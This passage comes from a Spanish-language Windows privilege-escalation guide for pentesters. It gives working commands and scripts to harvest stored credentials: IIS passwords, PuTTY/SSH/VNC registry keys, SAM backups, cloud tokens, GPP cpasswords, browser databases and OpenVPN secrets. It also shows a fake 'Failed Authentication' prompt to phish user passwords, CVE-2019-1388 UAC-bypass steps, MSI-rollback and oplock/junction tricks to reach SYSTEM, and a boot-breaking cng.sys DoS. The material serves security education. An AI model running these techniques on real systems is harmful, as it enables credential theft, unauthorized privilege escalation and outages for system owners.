Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Comprueba si existe `C:\Windows\CCM\SCClient.exe` .\
Los instaladores se **ejecutan con privilegios de SYSTEM**, muchos son vulnerables a **DLL Sideloading (Información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credenciales)

### Credenciales de PuTTY
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Claves de host SSH de PuTTY
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Claves SSH en el registro

Las claves privadas SSH pueden almacenarse dentro de la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, por lo que deberías comprobar si hay algo interesante allí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta, probablemente sea una llave SSH guardada. Está almacenada de forma cifrada, pero puede descifrarse fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves SSH, añadirlas con `ssh-add` e iniciar sesión mediante SSH en una máquina. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación mediante clave asimétrica.

### Archivos desatendidos
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups de SAM y SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales de Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña GPP almacenada en caché

Anteriormente, existía una función que permitía implementar cuentas de administrador local personalizadas en un grupo de equipos mediante Group Policy Preferences (GPP). Sin embargo, este método presentaba importantes fallos de seguridad. En primer lugar, los Group Policy Objects (GPO), almacenados como archivos XML en SYSVOL, podían ser accedidos por cualquier usuario del dominio. En segundo lugar, las contraseñas dentro de estos GPP, cifradas con AES256 mediante una clave predeterminada documentada públicamente, podían ser descifradas por cualquier usuario autenticado. Esto suponía un riesgo grave, ya que podía permitir a los usuarios obtener privilegios elevados.

Para mitigar este riesgo, se desarrolló una función que busca archivos GPP almacenados localmente en caché que contengan un campo "cpassword" no vacío. Al encontrar un archivo de este tipo, la función descifra la contraseña y devuelve un objeto PowerShell personalizado. Este objeto incluye información sobre el GPP y la ubicación del archivo, lo que facilita la identificación y corrección de esta vulnerabilidad de seguridad.

Busca estos archivos en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Uso de crackmapexec para obtener las contraseñas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuración web de IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registros
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Solicitar credenciales

Siempre puedes **pedir al usuario que introduzca sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedir** directamente al cliente las **credenciales** es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Posibles nombres de archivo que contienen credenciales**

Archivos conocidos que en algún momento contenían **contraseñas** en **texto claro** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Busca en todos los archivos propuestos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciales en la Papelera de reciclaje

También deberías revisar la Papelera para buscar credenciales en su interior

Para **recuperar contraseñas** guardadas por varios programas puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraer claves de openssh del registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Debes buscar dbs donde se almacenen las contraseñas de **Chrome o Firefox**.\
También revisa el historial, los marcadores y los favoritos de los navegadores, ya que quizá haya **contraseñas almacenadas** allí.

Herramientas para extraer contraseñas de los navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software de distintos lenguajes. Cada componente COM se **identifica mediante un ID de clase (CLSID)** y cada componente expone funcionalidad mediante una o más interfaces, identificadas mediante ID de interfaz (IID).

Las clases e interfaces COM se definen en el registro bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface**, respectivamente. Este registro se crea combinando **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSID de este registro puedes encontrar el registro secundario **InProcServer32**, que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel**, que puede ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![Historial de navegadores - COM DLL Overwriting: Dentro de los CLSID de este registro puedes encontrar el registro secundario InProcServer32, que contiene un valor predeterminado que apunta a una DLL y un valor...](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLL** que se van a ejecutar, podrías **escalar privilegios** si esa DLL va a ser ejecutada por un usuario diferente.

Para aprender cómo los atacantes utilizan COM Hijacking como mecanismo de persistencia, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y el registro**

**Buscar contenido de archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre de archivo determinado**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registro nombres de claves y contraseñas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que he creado para **ejecutar automáticamente cada módulo POST de metasploit que busca credenciales** dentro de la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen las contraseñas mencionadas en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra excelente herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto plano (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Controladores filtrados

Imagina que **un proceso que se ejecuta como SYSTEM abre un proceso nuevo** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un proceso nuevo** (`CreateProcess()`) **con pocos privilegios, pero heredando todos los handles abiertos del proceso principal**.\
Entonces, si tienes **acceso completo al proceso con pocos privilegios**, puedes obtener el **handle abierto al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee [esta otra publicación para obtener una explicación más completa sobre cómo probar y abusar de más handles abiertos de procesos y threads heredados con diferentes niveles de permisos (no solo acceso completo)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Suplantación de clientes de Named Pipes

Los segmentos de memoria compartida, denominados **pipes**, permiten la comunicación y la transferencia de datos entre procesos.

Windows proporciona una función llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de diferentes redes. Esto se parece a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando un **cliente** envía datos a través de un pipe, el **servidor** que configuró el pipe tiene la capacidad de **adoptar la identidad** del **cliente**, siempre que tenga los derechos necesarios de **SeImpersonate**. Identificar un **proceso privilegiado** que se comunique mediante un pipe que puedas imitar ofrece la oportunidad de **obtener privilegios superiores**, adoptando la identidad de ese proceso cuando interactúe con el pipe que estableciste. Para obtener instrucciones sobre cómo ejecutar este ataque, puedes consultar guías útiles [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar una comunicación de named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite enumerar y visualizar todos los pipes para encontrar privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Escritura remota de DWORD en tapsrv de Telephony para lograr RCE

El servicio Telephony (TapiSrv), en modo servidor, expone `\\pipe\\tapsrv` (MS-TRP). Un cliente remoto autenticado puede abusar de la ruta de eventos asíncronos basada en mailslots para convertir `ClientAttach` en una **escritura arbitraria de 4 bytes** en cualquier archivo existente en el que `NETWORK SERVICE` pueda escribir, obtener posteriormente derechos de administrador de Telephony y cargar una DLL arbitraria como el servicio. Flujo completo:

- `ClientAttach` con `pszDomainUser` configurado con una ruta existente modificable → el servicio la abre mediante `CreateFileW(..., OPEN_EXISTING)` y la utiliza para las escrituras de eventos asíncronos.
- Cada evento escribe el `InitContext` controlado por el atacante desde `Initialize` en ese handle. Registra una aplicación de línea con `LRegisterRequestRecipient` (`Req_Func 61`), activa `TRequestMakeCall` (`Req_Func 121`), obtiene los eventos mediante `GetAsyncEvents` (`Req_Func 0`) y luego anula el registro/apaga el servicio para repetir escrituras deterministas.
- Añádete a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, vuelve a conectarte y, a continuación, llama a `GetUIDllName` con una ruta arbitraria de DLL para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Más detalles:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varios

### Extensiones de archivos que podrían ejecutar contenido en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Abuso de Protocol handler / ShellExecute mediante renderizadores de Markdown

Los enlaces de Markdown en los que se puede hacer clic y que se reenvían a `ShellExecuteExW` pueden activar URI handlers peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Consulta:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorización de líneas de comandos en busca de contraseñas**

Al obtener una shell como usuario, puede haber tareas programadas u otros procesos que se estén ejecutando y que **pasen credenciales en la línea de comandos**. El script siguiente captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el estado anterior, mostrando cualquier diferencia.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Robando contraseñas de los procesos

## De un usuario con pocos privilegios a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (mediante consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar un terminal o cualquier otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y evadir UAC al mismo tiempo aprovechando la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Tienes todos los archivos y la información necesarios en el siguiente repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## De Administrator Medium a High Integrity Level / UAC Bypass

Lee esto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Después, **lee esto para aprender sobre UAC y UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La técnica descrita [**en esta publicación de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), con código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

El ataque consiste básicamente en abusar de la función de rollback de Windows Installer para reemplazar archivos legítimos por archivos maliciosos durante el proceso de desinstalación. Para ello, el atacante debe crear un **instalador MSI malicioso** que se utilizará para secuestrar la carpeta `C:\Config.Msi`, que posteriormente Windows Installer usará para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI, cuyos archivos de rollback se habrán modificado para contener el payload malicioso.

La técnica resumida es la siguiente:

1. **Stage 1 – Preparación del Hijack (dejar `C:\Config.Msi` vacía)**

- Step 1: Instalar el MSI
- Crear un `.msi` que instale un archivo inofensivo (por ejemplo, `dummy.txt`) en una carpeta con permisos de escritura (`TARGETDIR`).
- Marcar el instalador como **"UAC Compliant"**, para que un **usuario no administrador** pueda ejecutarlo.
- Mantener un **handle** abierto al archivo después de la instalación.

- Step 2: Iniciar la desinstalación
- Desinstalar el mismo `.msi`.
- El proceso de desinstalación comienza a mover archivos a `C:\Config.Msi` y a cambiarles el nombre a archivos `.rbf` (copias de seguridad de rollback).
- **Hacer polling del handle abierto del archivo** mediante `GetFinalPathNameByHandle` para detectar cuándo el archivo se convierte en `C:\Config.Msi\<random>.rbf`.

- Step 3: Sincronización personalizada
- El `.msi` incluye una **acción de desinstalación personalizada (`SyncOnRbfWritten`)** que:
- Señala cuándo se ha escrito el archivo `.rbf`.
- Después, **espera** otro evento antes de continuar con la desinstalación.

- Step 4: Bloquear la eliminación del `.rbf`
- Cuando se reciba la señal, **abrir el archivo `.rbf`** sin `FILE_SHARE_DELETE`; esto **impide que se elimine**.
- Después, **enviar la señal de vuelta** para que la desinstalación pueda finalizar.
- Windows Installer no puede eliminar el `.rbf` y, como no puede eliminar todo el contenido, **`C:\Config.Msi` no se elimina**.

- Step 5: Eliminar manualmente el `.rbf`
- Tú, el atacante, eliminas manualmente el archivo `.rbf`.
- Ahora **`C:\Config.Msi` está vacía**, lista para ser secuestrada.

> En este punto, **activa la vulnerabilidad de eliminación arbitraria de carpetas a nivel SYSTEM** para eliminar `C:\Config.Msi`.

2. **Stage 2 – Reemplazar los scripts de rollback por scripts maliciosos**

- Step 6: Recrear `C:\Config.Msi` con ACLs débiles
- Recrear tú mismo la carpeta `C:\Config.Msi`.
- Establecer **DACLs débiles** (por ejemplo, Everyone:F) y **mantener un handle abierto** con `WRITE_DAC`.

- Step 7: Ejecutar otra instalación
- Instalar nuevamente el `.msi`, con:
- `TARGETDIR`: Ubicación con permisos de escritura.
- `ERROROUT`: Una variable que active un fallo forzado.
- Esta instalación se utilizará para activar nuevamente el **rollback**, que lee `.rbs` y `.rbf`.

- Step 8: Monitorizar la aparición de `.rbs`
- Usar `ReadDirectoryChangesW` para monitorizar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
- Capturar su nombre de archivo.

- Step 9: Sincronizar antes del rollback
- El `.msi` contiene una **acción de instalación personalizada (`SyncBeforeRollback`)** que:
- Señala un evento cuando se crea el `.rbs`.
- Después, **espera** antes de continuar.

- Step 10: Volver a aplicar la ACL débil
- Después de recibir el evento de `.rbs creado`:
- Windows Installer **vuelve a aplicar ACLs fuertes** a `C:\Config.Msi`.
- Pero como todavía tienes un handle con `WRITE_DAC`, puedes **volver a aplicar las ACLs débiles**.

> Las ACLs **solo se aplican al abrir el handle**, por lo que todavía puedes escribir en la carpeta.

- Step 11: Colocar archivos `.rbs` y `.rbf` falsos
- Sobrescribir el archivo `.rbs` con un **script de rollback falso** que indique a Windows que:
- Restaure tu archivo `.rbf` (DLL maliciosa) en una **ubicación privilegiada** (por ejemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Colocar tu `.rbf` falso, que contiene una **DLL payload maliciosa a nivel SYSTEM**.

- Step 12: Activar el rollback
- Señalar el evento de sincronización para que el instalador continúe.
- Se configura una **acción personalizada de tipo 19 (`ErrorOut`)** para que **el fallo de la instalación sea intencionado** en un punto conocido.
- Esto provoca que **comience el rollback**.

- Step 13: SYSTEM instala tu DLL
- Windows Installer:
- Lee tu `.rbs` malicioso.
- Copia la DLL `.rbf` en la ubicación objetivo.
- Ahora tienes tu **DLL maliciosa en una ruta cargada por SYSTEM**.

- Paso final: Ejecutar código SYSTEM
- Ejecutar un binario de confianza **auto-elevated** (por ejemplo, `osk.exe`) que cargue la DLL secuestrada.
- **Boom**: tu código se ejecuta **como SYSTEM**.


### De Arbitrary File Delete/Move/Rename a SYSTEM EoP

La técnica principal de rollback de MSI (la anterior) asume que puedes eliminar una **carpeta completa** (por ejemplo, `C:\Config.Msi`). Pero ¿qué ocurre si tu vulnerabilidad solo permite la **eliminación arbitraria de archivos**?

Podrías explotar los **internals de NTFS**: cada carpeta tiene un alternate data stream oculto llamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream almacena los **metadatos del índice** de la carpeta.

Por lo tanto, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina toda la carpeta** del sistema de archivos.

Puedes hacer esto mediante APIs estándar de eliminación de archivos, como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Aunque estés llamando a una API de eliminación de *archivos*, esta **elimina la propia carpeta**.

### De la eliminación del contenido de una carpeta a SYSTEM EoP
¿Qué ocurre si tu primitive no te permite eliminar archivos o carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por el atacante**?

1. Paso 1: Configura una carpeta y un archivo señuelo
- Crea: `C:\temp\folder1`
- Dentro de ella: `C:\temp\folder1\file1.txt`

2. Paso 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Paso 3: Activar el proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso analiza carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, el **oplock se activa** y transfiere el control a tu callback.

4. Paso 4: Dentro del callback del oplock: redirigir la eliminación

- Opción A: Mover `file1.txt` a otra ubicación
- Esto vacía `folder1` sin romper el oplock.
- No elimines `file1.txt` directamente; eso liberaría el oplock prematuramente.

- Opción B: Convertir `folder1` en una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opción C: Create un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Esto apunta al stream interno de NTFS que almacena los metadatos de la carpeta; eliminarlo elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido al junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### Desde la creación de una carpeta arbitraria hasta un DoS permanente

Explota una primitiva que permite **crear una carpeta arbitraria como SYSTEM/admin**, incluso si **no puedes escribir archivos** ni **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, por ejemplo:
```
C:\Windows\System32\cng.sys
```
- Esta ruta normalmente corresponde al driver en modo kernel `cng.sys`.
- Si lo **precreas como una carpeta**, Windows no puede cargar el driver real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Detecta la carpeta, **no puede resolver el driver real** y **se bloquea o detiene el arranque**.
